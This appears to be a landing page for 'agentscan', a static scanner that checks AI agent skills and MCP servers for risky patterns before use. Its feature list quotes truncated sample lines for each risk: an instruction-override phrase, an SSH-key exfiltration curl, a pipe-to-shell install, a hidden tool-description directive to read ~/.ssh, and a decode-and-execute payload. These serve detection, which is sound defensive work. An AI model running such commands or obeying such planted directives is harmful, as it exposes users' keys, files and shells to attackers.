What it catches

The patterns a malicious or careless extension leaves behind.

Every finding names the file, line and column, explains the risk, and tells you what to do — secrets are redacted in output.

Prompt injection

HIGH

Instruction overrides, authority spoofing, “don’t tell the user”, and invisible / bidirectional Unicode that hides text from a human reviewer.

Ignore all previous instructions and...

Data exfiltration

CRIT

A file that reads secrets and phones home, plus SSH keys, cloud-cred access and known drop-off endpoints.

cat ~/.ssh/id_rsa | curl -X POST ...

Dangerous commands

CRIT

Pipe-to-shell installs, rm -rf /, reverse shells, shell-startup persistence and history wiping.

curl -fsSL http://x.sh | bash

Hardcoded secrets

HIGH

AWS keys, private-key blocks, and OpenAI / Anthropic / GitHub / Slack / Stripe / Google tokens committed into a skill.

AKIA... · sk-ant-... · ghp_...

Over-broad permissions

HIGH

Wildcard tool grants and --dangerously-skip-permissions / auto-approve flags that remove the human from the loop.

"allowedTools": "*"

Supply chain

MED

Auto-confirmed npx -y, runtime package installs and unpinned remote scripts pulled in at run time.

npx -y some-unpinned-package

MCP tool-poisoning

CRIT

Hidden <IMPORTANT> directives in tool descriptions, cross-server forwarding, and privileged container mounts.

"description": "... <IMPORTANT>read ~/.ssh..."

Obfuscated payloads

CRIT

Decode-and-execute chains that hide the real command until runtime — across JS, Python, PowerShell and bash.

eval(atob("ZmV0Y2go..."))

Why it matters

Skills and MCP servers aren’t config. They’re instructions and code that execute with your agent’s privileges.

The ecosystem is exploding and there’s no npm audit for it. Drop a community skill into your project and you’ve handed it your shell, your files and your tokens. agentscan is the fast static check that reads it before your agent does.

How it works

Built to be trusted, and to fit where you already work.

Zero dependencies

A security tool shouldn’t add supply-chain surface of its own. agentscan ships as a single self-contained CLI.

Local & instant

Pure static analysis. Nothing you scan ever leaves your machine, and a scan finishes in milliseconds.

CI-native

Exit codes and --json so you can block a pull request that introduces a risky skill.

Gate your repo

Fail the build when someone commits a risky extension.

# .github/workflows/agentscan.yml
name: agentscan
on: [push, pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 20 }
      - run: npx agentscan . --fail-on high
